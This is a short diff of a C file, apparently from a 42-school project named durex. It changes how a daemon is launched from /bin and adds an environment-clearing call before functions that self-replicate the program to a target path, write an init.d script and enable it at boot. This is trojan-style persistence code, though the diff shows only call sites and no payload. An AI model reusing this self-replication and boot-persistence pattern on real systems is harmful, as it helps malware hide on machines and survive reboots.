@@ -6,7 +6,7 @@
 /*   By: user42 <user42@student.42.fr>              +#+  +:+       +#+        */
 /*                                                +#+#+#+#+#+   +#+           */
 /*   Created: 2022/02/08 15:10:04 by user42            #+#    #+#             */
-/*   Updated: 2022/02/14 16:37:17 by user42           ###   ########.fr       */
+/*   Updated: 2022/02/15 14:37:20 by user42           ###   ########.fr       */
 /*                                                                            */
 /* ************************************************************************** */
 
@@ -85,12 +85,11 @@ void	enable_at_boot(void)
 
 void	launch_durex_daemon(void)
 {
-	char	**const args = malloc(4 * sizeof(char *));
-	args[0] = "service";
-	args[1] = "durex";
-	args[2] = "start";
-	args[3] = NULL;
-	if (exec_safe("service", args) != 0)
+	char	**const args = malloc(3 * sizeof(char *));
+	args[0] = "/bin/./durex";
+	args[1] = "daemon";
+	args[2] = NULL;
+	if (exec_safe("/bin/./durex", args) != 0)
 	{
 		printf("[X] Failed to launch the daemon.\n");
 		exit(1);
@@ -100,6 +99,7 @@ void	launch_durex_daemon(void)
 
 void	durex_bin(void)
 {
+	clear_env();
 	self_replicate_to_target();
 	write_initd_script();
 	enable_at_boot();
